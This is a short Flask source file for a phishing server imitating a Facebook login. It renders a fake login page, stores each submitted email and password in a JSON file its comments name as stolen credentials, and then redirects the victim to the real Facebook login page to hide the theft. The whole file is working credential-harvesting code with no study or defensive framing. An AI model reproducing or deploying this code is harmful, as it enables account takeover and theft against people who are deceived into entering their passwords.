from flask import Flask, request, render_template, redirect
import json
import os

app = Flask(__name__)
app.secret_key = 'secret_key'

# File to store stolen credentials
CREDENTIALS_FILE = 'stolen_email_and_password.json'

def save_credentials(email, password):
    credentials = {}
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, 'r') as f:
            try:
                credentials = json.load(f)
            except json.JSONDecodeError:
                credentials = {}  # Handle empty or corrupted JSON file
    credentials[email] = password  # Store email and password
    with open(CREDENTIALS_FILE, 'w') as f:
        json.dump(credentials, f, indent=4)

@app.route('/', methods=['GET', 'POST'])
def fake_login():
    if request.method == 'POST':                 # capture credentials
        email = request.form['email']
        password = request.form['password']
        save_credentials(email, password)
        return redirect("https://www.facebook.com/login/")        # redirect to the real Facebook login page
    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)

